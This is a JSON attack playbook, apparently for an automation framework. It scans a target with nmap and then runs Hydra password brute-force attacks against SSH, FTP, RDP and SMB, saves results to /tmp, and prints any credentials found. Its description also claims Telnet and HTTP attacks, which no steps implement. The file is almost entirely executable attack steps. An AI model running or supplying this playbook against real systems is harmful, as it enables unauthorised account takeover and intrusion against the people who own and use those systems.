{
  "name": "brute_multi",
  "description": "Multi-protocol brute-force: attempt login against SSH, FTP, RDP, SMB, Telnet, and HTTP using Hydra.",
  "author": "james-linux",
  "version": "1.0",
  "requires_root": false,
  "steps": [
    {
      "id": "service_detect",
      "action": "nmap.scan",
      "params": {
        "target": "{{target}}",
        "flags": "-sV",
        "ports": "21,22,23,80,443,445,3389,3306,5432,8080"
      },
      "description": "Service detection on common brute-force targets"
    },
    {
      "id": "hydra_ssh",
      "action": "layer.run",
      "params": {
        "command": "hydra -l {{username}} -P {{wordlist}} {{target}} ssh -t 4 -f -o /tmp/james_brute_ssh.txt 2>&1 | tail -5",
        "timeout": 300
      },
      "description": "SSH brute-force"
    },
    {
      "id": "hydra_ftp",
      "action": "layer.run",
      "params": {
        "command": "hydra -l {{username}} -P {{wordlist}} {{target}} ftp -t 8 -f -o /tmp/james_brute_ftp.txt 2>&1 | tail -5",
        "timeout": 300
      },
      "description": "FTP brute-force"
    },
    {
      "id": "hydra_rdp",
      "action": "layer.run",
      "params": {
        "command": "hydra -l {{username}} -P {{wordlist}} {{target}} rdp -t 4 -f -o /tmp/james_brute_rdp.txt 2>&1 | tail -5",
        "timeout": 300
      },
      "description": "RDP brute-force"
    },
    {
      "id": "hydra_smb",
      "action": "layer.run",
      "params": {
        "command": "hydra -l {{username}} -P {{wordlist}} {{target}} smb -t 4 -f -o /tmp/james_brute_smb.txt 2>&1 | tail -5",
        "timeout": 300
      },
      "description": "SMB brute-force"
    },
    {
      "id": "show_results",
      "action": "layer.run",
      "params": {
        "command": "echo '=== BRUTE FORCE RESULTS ===' && for f in /tmp/james_brute_*.txt; do echo \"--- $(basename $f) ---\" && cat $f 2>/dev/null; done",
        "timeout": 5
      },
      "description": "Display all found credentials"
    }
  ]
}
